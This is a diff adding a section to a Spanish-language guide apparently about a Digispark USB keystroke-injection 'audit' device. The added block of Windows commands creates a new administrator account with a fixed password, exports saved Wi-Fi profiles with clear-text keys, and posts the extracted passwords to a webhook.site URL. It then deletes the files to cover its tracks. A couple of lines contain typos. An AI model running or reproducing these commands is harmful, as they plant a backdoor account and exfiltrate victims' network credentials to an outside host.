@@ -59,6 +59,21 @@ void loop() {
 }
 ```
 
+## Comandos por si no va el digispark
+
+```
+Windows. Simbolo del sistema, con permisos de administrador.
+net user Usuario-Auditoria D2z14IdWykPO /add
+net localgroup Administradores Usuario-Auditoria /add
+cd %temp%
+netsh wlan export profile key=clear");
+powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > PASS
+powershell Invoke-WebRequest -Uri https://webhook.site/d5dbbd9c-cf83-4df7-adfb-10894b22d13a -Method POST -InFile PASS
+del Wi-* /s /f /q 6 del PASS
+exit
+```
+
+
 Cuando en el script nos aparezca esto, le daremos a SI:
 
 ![](/assets/img/auditoria/cmd.png.jpg)
